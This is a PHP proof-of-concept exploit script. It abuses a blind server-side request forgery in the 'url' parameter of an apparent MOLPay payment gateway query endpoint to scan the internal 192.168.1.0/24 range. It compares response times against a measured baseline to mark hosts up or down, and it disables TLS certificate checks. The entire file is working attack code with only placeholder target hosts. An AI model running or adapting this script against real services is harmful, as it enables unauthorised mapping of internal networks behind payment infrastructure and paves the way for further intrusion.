#!/usr/bin/php
<?php

// Server Behind Cloud : x.x.x.x
// Vulnerable Endpoint:  https://some.domain/index.php?amount=0000&txID=1111&domain=2222&skey=3333&url=VULN_PARAMETER&type=1

// This Script will attempt to enumerate internal hosts by scanning the range 192.168.1.0/24
// the same approche could be done with 192.168.0.0/16,  I used same host ip just to save time

echo "\n# Starting Internal Network Scan: 192.168.1.0/24 \n";

// Getting Average Normal Server Response time, looping though IP's, making time-based check as it's blind vuln.
$n = get_average_normal_response_time();
for($i = 0; $i < 255; $i++){
	$response_time = get_response_time($i);
	echo "\n- Checking 192.168.1.$i --> ";
	if($n < $response_time){
		echo " UP";
	}else{
		echo " DOWN";
	}
}


function get_response_time($i) {
    $curl = curl_init("https://insert-ip-here/MOLPay/API/gate-query/index.php?amount=0000&txID=1111&domain=2222&skey=3333&type=1&url=http://192.168.1.$i/");
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0");
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); 
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_TIMEOUT, 15);
    curl_exec($curl);
	$r = curl_getinfo($curl)["total_time"];
	curl_close($curl);
	return intval($r*1000); // converting seconds to milliseconds
}


function get_average_normal_response_time(){
	$av = [];
	$total = 0;
	for($i = 0; $i < 10; $i++){
		$curl = curl_init("https://insert-ip-here/MOLPay/API/gate-query/index.php");
		curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0");
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); 
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_TIMEOUT, 15);
		curl_exec($curl);
		$rr = intval(curl_getinfo($curl)["total_time"] * 1000);
		curl_close($curl);
		array_push($av, $rr);
	}
	foreach($av as $y){
		$total = $total + $y;
	}
	$average = ($total / 10) + 19;
	return $average;
}


